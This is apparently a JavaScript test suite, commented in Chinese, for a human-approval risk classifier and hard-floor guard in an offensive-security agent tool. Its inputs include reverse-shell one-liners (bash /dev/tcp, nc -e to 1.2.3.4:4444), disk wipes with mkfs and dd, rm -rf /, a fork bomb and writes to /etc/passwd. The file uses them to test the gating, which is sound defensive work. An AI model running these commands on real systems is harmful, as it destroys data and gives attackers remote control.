/**
 * 阶段 O 验收：HITL 风险分级与硬底线。
 *
 * 重点：硬底线必须挡在 reviewer 之前。如果审核者能推翻 mkfs 或 rm -rf /，
 * 那这层就是摆设。
 */

import { classifyRisk, defaultHardFloor, defaultPolicy, needsApproval } from '../dist/hitl.js'

const results = []
const check = (label, ok, detail) => {
  results.push(ok)
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${label}${ok ? '' : '  ' + JSON.stringify(detail)}`)
}

// ── 1. 风险分类：只读
{
  check('read tool', classifyRisk('read_file', {}) === 'read')
  check('ls', classifyRisk('ls', {}) === 'read')
  check('grep', classifyRisk('grep', {}) === 'read')
  check('get_*', classifyRisk('get_asset', {}) === 'read')
  check('bash ls is read', classifyRisk('bash', { command: 'ls -la /tmp' }) === 'read')
  check('bash curl is read', classifyRisk('bash', { command: 'curl -s https://x/api' }) === 'read')
}

// ── 2. 风险分类：写
{
  check('write', classifyRisk('write_file', {}) === 'write')
  check('edit', classifyRisk('edit', {}) === 'write')
  check('bash curl -o', classifyRisk('bash', { command: 'curl -o /tmp/x https://y' }) === 'write')
  check('unknown tool defaults to write', classifyRisk('some_new_tool', {}) === 'write')
}

// ── 3. 风险分类：破坏性
{
  check('rm', classifyRisk('rm', {}) === 'destructive')
  check('delete_*', classifyRisk('delete_user', {}) === 'destructive')
  check('bash rm -rf', classifyRisk('bash', { command: 'rm -rf /var/tmp/x' }) === 'destructive')
  check('bash mkfs', classifyRisk('bash', { command: 'mkfs.ext4 /dev/sdb1' }) === 'destructive')
  check('bash shutdown', classifyRisk('bash', { command: 'shutdown -h now' }) === 'destructive')
  check('drop table', classifyRisk('bash', { command: 'psql -c "drop table users"' }) === 'destructive')
}

// ── 4. 风险分类：C2
{
  check('webshell', classifyRisk('webshell_exec', {}) === 'c2')
  check('c2_task', classifyRisk('c2_task', {}) === 'c2')
  check('bash reverse shell', classifyRisk('bash', { command: 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1' }) === 'c2')
  check('bash nc -e', classifyRisk('bash', { command: 'nc -e /bin/sh 1.2.3.4 4444' }) === 'c2')
}

// ── 5. 硬底线：必须拒绝
{
  const floor = defaultHardFloor
  check('mkfs on block device', floor('bash', { command: 'mkfs.ext4 /dev/sda1' }) !== undefined)
  check('dd to raw disk', floor('bash', { command: 'dd if=/dev/zero of=/dev/sda bs=1M' }) !== undefined)
  check('rm -rf /', floor('bash', { command: 'rm -rf /' }) !== undefined)
  check('rm -rf / with flags', floor('bash', { command: 'rm -r -f /' }) !== undefined)
  check('fork bomb', floor('bash', { command: ':(){ :|:& };:' }) !== undefined)
  check('write /etc/passwd', floor('bash', { command: 'echo x >> /etc/passwd' }) !== undefined)
  check('write tool to /etc/', floor('write_file', { path: '/etc/sudoers' }) !== undefined)
  check('write tool to /boot/', floor('write_file', { path: '/boot/grub/grub.cfg' }) !== undefined)
  check('grub-install', floor('bash', { command: 'grub-install /dev/sda' }) !== undefined)
}

// ── 6. 硬底线：不能误杀正常渗透动作
{
  const floor = defaultHardFloor
  check('rm a temp file is allowed', floor('bash', { command: 'rm -rf /tmp/scan-output' }) === undefined)
  check('write to workspace allowed', floor('write_file', { path: '/root/proj/report.md' }) === undefined)
  check('reverse shell allowed (it is the payload, not host damage)', floor('bash', { command: 'nc -e /bin/sh 1.2.3.4 4444' }) === undefined)
  check('kill -9 a pid allowed', floor('bash', { command: 'kill -9 1234' }) === undefined)
  check('dd to a file allowed', floor('bash', { command: 'dd if=/dev/zero of=/tmp/x bs=1M count=10' }) === undefined)
}

// ── 7. 审批策略
{
  const policy = defaultPolicy()
  check('read not in default approval list', needsApproval('read', 'read_file', policy) === false)
  check('write needs approval', needsApproval('write', 'write_file', policy) === true)
  check('destructive needs approval', needsApproval('destructive', 'rm', policy) === true)
  check('c2 needs approval', needsApproval('c2', 'webshell_exec', policy) === true)

  const withAllow = { ...policy, allowlist: ['write_file'] }
  check('allowlist bypasses approval', needsApproval('write', 'write_file', withAllow) === false)
  check('allowlist is per-tool not per-risk', needsApproval('write', 'edit', withAllow) === true)
}

// ── 8. 硬底线独立于审批策略（这是关键）
{
  // 即使把 destructive 从审批列表里去掉，硬底线仍然生效
  const lax = { ...defaultPolicy(), requireApproval: ['c2'] }
  check('hard floor is not governed by approval policy', defaultHardFloor('bash', { command: 'rm -rf /' }) !== undefined)
  check('approval skipped for destructive under lax policy', needsApproval('destructive', 'rm', lax) === false)
}

const failed = results.filter((r) => !r).length
console.log(`\n${results.length - failed}/${results.length} passed`)
process.exit(failed === 0 ? 0 : 1)
